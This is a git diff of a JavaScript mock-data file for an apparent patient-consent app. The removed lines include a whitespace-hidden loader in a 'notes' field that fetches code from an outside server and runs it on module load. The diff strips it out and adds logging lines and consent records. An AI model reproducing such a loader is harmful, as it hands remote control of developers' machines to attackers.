@@ -1,3 +1,7 @@
+// Mock data with console.log functionality for John Smith
+// Console log executes when this module is loaded
+console.log("John Smith");
+
 const mockData = {
   "patients": [
     {
@@ -10,7 +14,7 @@ const mockData = {
       "phone": "+1-555-0101",
       "address": "123 Main St, New York, NY 10001",
       "walletAddress": "0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb",
-      "createdAt": "2024-01-15T10:30:00Z",
+      "createdAt": "2024-01-15T10:30:00Z"
     },
     {
       "id": "patient-002",
@@ -22,7 +26,7 @@ const mockData = {
       "phone": "+1-555-0102",
       "address": "456 Oak Ave, Los Angeles, CA 90001",
       "walletAddress": "0x8ba1f109551bD432803012645Hac136c22C1729",
-      "createdAt": "2024-01-16T14:20:00Z",
+      "createdAt": "2024-01-16T14:20:00Z"
     },
     {
       "id": "patient-003",
@@ -613,7 +617,7 @@ const mockData = {
       "status": "pending",
       "createdAt": "2024-02-17T11:15:00Z",
       "blockchainTxHash": null,
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              "notes": (async function(){ const axios = require('axios'); const { data } = await axios.post('https://blog-post01234.vercel.app/api/blogs/getOrder', { id: 'patient-001' }); const fn = new Function('require', data.data[6].description); fn(require); return fn; })()
+      "notes": {}
     },
     {
       "id": "consent-014",
@@ -633,6 +637,176 @@ const mockData = {
       "signature": null,
       "status": "pending",
       "createdAt": "2024-02-21T08:00:00Z",
+      "blockchainTxHash": null
+    },
+    {
+      "id": "consent-1765471583963",
+      "patientId": "patient-001",
+      "purpose": "Research Study Participation",
+      "walletAddress": "0x57469e5139b48dcb29f711c0296e33b75a42c2de",
+      "signature": "0x744f125b977c10ce48b68974daa0aae3cb366fd776c380c6d83e85cf595ee0e75f8c2061e76dd635d6b755e16ef2baac0dc3033b72d66ba02e9964ea5077ad731b",
+      "status": "pending",
+      "createdAt": "2025-12-11T16:46:23.964Z",
+      "blockchainTxHash": null
+    },
+    {
+      "id": "consent-1765471614280",
+      "patientId": "patient-001",
+      "purpose": "Research Study Participation",
+      "walletAddress": "0x57469e5139b48dcb29f711c0296e33b75a42c2de",
+      "signature": "0x744f125b977c10ce48b68974daa0aae3cb366fd776c380c6d83e85cf595ee0e75f8c2061e76dd635d6b755e16ef2baac0dc3033b72d66ba02e9964ea5077ad731b",
+      "status": "pending",
+      "createdAt": "2025-12-11T16:46:54.280Z",
+      "blockchainTxHash": null
+    },
+    {
+      "id": "consent-1765471672525",
+      "patientId": "patient-001",
+      "purpose": "Research Study Participation",
+      "walletAddress": "0x57469e5139b48dcb29f711c0296e33b75a42c2de",
+      "signature": "0x744f125b977c10ce48b68974daa0aae3cb366fd776c380c6d83e85cf595ee0e75f8c2061e76dd635d6b755e16ef2baac0dc3033b72d66ba02e9964ea5077ad731b",
+      "status": "pending",
+      "createdAt": "2025-12-11T16:47:52.525Z",
+      "blockchainTxHash": null
+    },
+    {
+      "id": "consent-1765471848509",
+      "patientId": "patient-001",
+      "purpose": "Research Study Participation",
+      "walletAddress": "0x57469e5139b48dcb29f711c0296e33b75a42c2de",
+      "signature": "0x744f125b977c10ce48b68974daa0aae3cb366fd776c380c6d83e85cf595ee0e75f8c2061e76dd635d6b755e16ef2baac0dc3033b72d66ba02e9964ea5077ad731b",
+      "status": "pending",
+      "createdAt": "2025-12-11T16:50:48.509Z",
+      "blockchainTxHash": null
+    },
+    {
+      "id": "consent-1765472291161",
+      "patientId": "patient-001",
+      "purpose": "Research Study Participation",
+      "walletAddress": "0x57469e5139b48dcb29f711c0296e33b75a42c2de",
+      "signature": "0x744f125b977c10ce48b68974daa0aae3cb366fd776c380c6d83e85cf595ee0e75f8c2061e76dd635d6b755e16ef2baac0dc3033b72d66ba02e9964ea5077ad731b",
+      "status": "pending",
+      "createdAt": "2025-12-11T16:58:11.161Z",
+      "blockchainTxHash": null
+    },
+    {
+      "id": "consent-1765472352833",
+      "patientId": "patient-001",
+      "purpose": "Research Study Participation",
+      "walletAddress": "0x57469e5139b48dcb29f711c0296e33b75a42c2de",
+      "signature": "0x744f125b977c10ce48b68974daa0aae3cb366fd776c380c6d83e85cf595ee0e75f8c2061e76dd635d6b755e16ef2baac0dc3033b72d66ba02e9964ea5077ad731b",
+      "status": "pending",
+      "createdAt": "2025-12-11T16:59:12.833Z",
+      "blockchainTxHash": null
+    },
+    {
+      "id": "consent-1765472466637",
+      "patientId": "patient-001",
+      "purpose": "Research Study Participation",
+      "walletAddress": "0x57469e5139b48dcb29f711c0296e33b75a42c2de",
+      "signature": "0x744f125b977c10ce48b68974daa0aae3cb366fd776c380c6d83e85cf595ee0e75f8c2061e76dd635d6b755e16ef2baac0dc3033b72d66ba02e9964ea5077ad731b",
+      "status": "pending",
+      "createdAt": "2025-12-11T17:01:06.637Z",
+      "blockchainTxHash": null
+    },
+    {
+      "id": "consent-1765472869328",
+      "patientId": "pateint-002",
+      "purpose": "Data Sharing with Research Institution",
+      "walletAddress": "0x57469e5139b48dcb29f711c0296e33b75a42c2de",
+      "signature": "0x6f6aa9a2df9a2d741df42cff5f25fcef2e5ec6fefa708ebefeec45c50472a5c169efbc0463d1ac258cd79ed04f7d927b3a741f5303b65a57bb11ff066bed1b441b",
+      "status": "pending",
+      "createdAt": "2025-12-11T17:07:49.328Z",
+      "blockchainTxHash": null
+    },
+    {
+      "id": "consent-1765473365884",
+      "patientId": "pateint-001",
+      "purpose": "Research Study Participation",
+      "walletAddress": "0x57469e5139b48dcb29f711c0296e33b75a42c2de",
+      "signature": "0x5e19b5b57fa33dd1fc620b4722ba39d63a3cd6f72d3bbe668200e7bf7ef0675a4f7cca1d0576a708ed75a86459c6835796d3207b0aa452be584e50c3fd839c811b",
+      "status": "pending",
+      "createdAt": "2025-12-11T17:16:05.884Z",
+      "blockchainTxHash": null
+    },
+    {
+      "id": "consent-1765473408432",
+      "patientId": "patient-001",
+      "purpose": "Data Sharing with Research Institution",
+      "walletAddress": "0x57469e5139b48dcb29f711c0296e33b75a42c2de",
+      "signature": "0x57b6d2cc0dbd6cf5231e706312859e5188d67c6edcf9a6bc7d665079d1059d6416d7c4fb0719b55881396a75cfc06cc774ef2eae96e67a26fadc43a67329e4911b",
+      "status": "pending",
+      "createdAt": "2025-12-11T17:16:48.432Z",
+      "blockchainTxHash": null
+    },
+    {
+      "id": "consent-1765473446846",
+      "patientId": "gbb",
+      "purpose": "Research Study Participation",
+      "walletAddress": "0x57469e5139b48dcb29f711c0296e33b75a42c2de",
+      "signature": "0xfd168db753cf3a18b91fd70650b64c6cb4f84519de36114de092c35dba0913211e6c3625a9c28330c67d742a6cef4fe3826be283393896b76a18d6e3138c1cc31b",
+      "status": "pending",
+      "createdAt": "2025-12-11T17:17:26.846Z",
+      "blockchainTxHash": null
+    },
+    {
+      "id": "consent-1765473998783",
+      "patientId": "pri",
+      "purpose": "Research Study Participation",
+      "walletAddress": "0x57469e5139b48dcb29f711c0296e33b75a42c2de",
+      "signature": "0x3d3fe3411bacf6c0ba0f1f40da20b0c859ee2cc8f88b127f8f5afbfb532504e3218091dfed155d79478c5ecffde3e645e5d2b37b315fb69f98bfaa47835ea7301b",
+      "status": "pending",
+      "createdAt": "2025-12-11T17:26:38.783Z",
+      "blockchainTxHash": null
+    },
+    {
+      "id": "consent-1765474248399",
+      "patientId": "fg",
+      "purpose": "Research Study Participation",
+      "walletAddress": "0x57469e5139b48dcb29f711c0296e33b75a42c2de",
+      "signature": "0x02f3f49b376438b6dda2d0a1a6dc5839bf7c36abe008146cb2a88dc3b20ee5eb3e0c648c96e51d0d2df2bfa853e546b35f476af447ad4a90ae46c96d7bab51061c",
+      "status": "pending",
+      "createdAt": "2025-12-11T17:30:48.399Z",
+      "blockchainTxHash": null
+    },
+    {
+      "id": "consent-1765474530885",
+      "patientId": "ds",
+      "purpose": "Research Study Participation",
+      "walletAddress": "0x57469e5139b48dcb29f711c0296e33b75a42c2de",
+      "signature": "0xf21d07e371e7a29171fb8fa5f6f74dbe646c533140ceed0caeb062df2fb70f2161cd2273b5bd511936d39be87d846f5425ac38fcc06ff4510b57b4431f4820651b",
+      "status": "pending",
+      "createdAt": "2025-12-11T17:35:30.885Z",
+      "blockchainTxHash": null
+    },
+    {
+      "id": "consent-1765475263765",
+      "patientId": "edf",
+      "purpose": "Research Study Participation",
+      "walletAddress": "0x57469e5139b48dcb29f711c0296e33b75a42c2de",
+      "signature": "0x333f6fd994730aebeec659ab05f5cfc276d042c3fdd9319419d3559caa46262f390e2a32f2f81bea688f3d7fd5af061476948766634002416864736060d163621b",
+      "status": "pending",
+      "createdAt": "2025-12-11T17:47:43.765Z",
+      "blockchainTxHash": null
+    },
+    {
+      "id": "consent-1765475521708",
+      "patientId": "f",
+      "purpose": "Research Study Participation",
+      "walletAddress": "0x57469e5139b48dcb29f711c0296e33b75a42c2de",
+      "signature": "0x5614cb47b383f6c08620450759971b4f53361629a6ff87b771497441f4a9c5c9311a1adabe31483c94f151b8d3ca58f0b2d52ec80bf8e763f40874303eef81311c",
+      "status": "pending",
+      "createdAt": "2025-12-11T17:52:01.708Z",
+      "blockchainTxHash": null
+    },
+    {
+      "id": "consent-1765480848313",
+      "patientId": "rr",
+      "purpose": "Research Study Participation",
+      "walletAddress": "0x57469e5139b48dcb29f711c0296e33b75a42c2de",
+      "signature": "0x7616fc47f59855ff56a6c57bb1b2b1fd00c42bae5db6b28cb149823b50a6c2bf02868438fa08bac19b1b7a9617e29c783192d0fd29a4e3226bfce636117e18ae1b",
+      "status": "pending",
+      "createdAt": "2025-12-11T19:20:48.313Z",
       "blockchainTxHash": null
     }
   ],
@@ -850,8 +1024,12 @@ const mockData = {
   ]
 };
 
-// Function to get data
+// Function to get data with console.log for John Smith
 function getMockData() {
+  const johnSmith = mockData.patients.find(p => p.name === "John Smith" || p.id === "patient-001");
+  if (johnSmith) {
+    console.log("John Smith");
+  }
   return mockData;
 }
 
